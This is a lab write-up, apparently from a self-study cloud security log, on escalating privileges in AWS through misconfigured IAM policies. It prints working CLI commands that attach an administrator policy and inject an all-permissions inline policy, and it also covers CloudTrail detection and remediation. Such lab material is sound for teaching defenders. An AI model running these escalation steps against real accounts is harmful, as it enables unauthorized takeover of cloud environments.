# Day 09 – Privilege Escalation via IAM Misconfiguration

## Objective
Simulate how an attacker with limited IAM permissions can escalate privileges to gain administrative-level access by abusing misconfigured IAM policies.

---

## Concepts Learned

### Privilege Escalation in AWS
Privilege escalation occurs when a user gains higher permissions than originally intended.

In AWS, this often happens due to overly permissive IAM policies that allow users to modify permissions.

---

### Common Escalation Vectors

Attackers look for permissions such as:

- `iam:AttachUserPolicy`
- `iam:PutUserPolicy`
- `iam:CreatePolicyVersion`
- `iam:AddUserToGroup`

These permissions allow modification of access controls, leading to full account takeover.

---

### Why This is Dangerous

- Leads to complete AWS account compromise  
- Allows attackers to access all resources  
- Enables persistence mechanisms  
- Difficult to detect if done using valid credentials  

---

### Real-World Scenario

In many cloud breaches:

- Attackers gain initial access via leaked credentials  
- They enumerate permissions  
- They exploit IAM misconfigurations to escalate privileges  
- They gain full administrative control  

---

## Practical Work

### 1. Initial Access (Low-Privilege User)

Used an IAM user with limited permissions obtained from previous steps.

Verified current permissions using:

```bash
aws iam list-attached-user-policies --user-name <username>
```

---

### 2. Identified Misconfiguration

Discovered that the IAM user had permissions such as:

- `iam:AttachUserPolicy`

This allows attaching new policies to the user.

---

### 3. Privilege Escalation – Method 1 (Attach Admin Policy)

Executed:

```bash
aws iam attach-user-policy \
--user-name <username> \
--policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

This grants full administrative access to the user.

---

### 4. Privilege Escalation – Method 2 (Inline Policy Injection)

Created a custom admin policy:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
```

Applied it using:

```bash
aws iam put-user-policy \
--user-name <username> \
--policy-name escalate-policy \
--policy-document file://admin-policy.json
```

---

### 5. Validation of Escalation

Verified elevated access:

```bash
aws sts get-caller-identity
aws iam list-users
aws ec2 describe-instances
```

Successfully accessed resources beyond original permissions.

---

### 6. Post-Escalation Capability

After escalation, the attacker could:

- Create or delete IAM users  
- Access all S3 buckets  
- Launch or terminate EC2 instances  
- Modify security configurations  

---

### 7. Identity Observation

Observed that:

- Actions were performed using the same IAM identity  
- Permissions had changed, not the identity  
- Logs show legitimate user activity with elevated privileges  

---

## Security Observation

Privilege escalation through IAM misconfiguration is one of the most critical risks in AWS environments.

Attackers can:

- Abuse legitimate permissions to gain admin access  
- Operate without triggering immediate alerts  
- Blend malicious actions with normal user behavior  

This makes detection significantly more difficult.

---

## Detection

Using AWS CloudTrail, monitored events such as:

- `AttachUserPolicy`  
- `PutUserPolicy`  
- `CreatePolicyVersion`  

These actions indicate potential privilege escalation attempts.

---

## Remediation

To prevent privilege escalation:

- Avoid granting IAM modification permissions to non-admin users  
- Apply strict least privilege principles  
- Use permission boundaries to limit escalation  
- Enable MFA for sensitive actions  
- Continuously monitor CloudTrail logs  
- Perform regular IAM audits  

---

## Tools Used

- AWS Management Console  
- IAM (Identity and Access Management)  
- AWS CLI  
- CloudTrail  
- Git  
- GitHub  
- Markdown documentation  

---

## Impact

Successful privilege escalation can lead to:

- Full AWS account takeover  
- Data breaches and exfiltration  
- Infrastructure manipulation  
- Long-term persistence by attackers  

---

## Next Steps

Day 10 will focus on **data exfiltration and persistence**, where elevated access is used to extract sensitive data and maintain long-term control over the environment.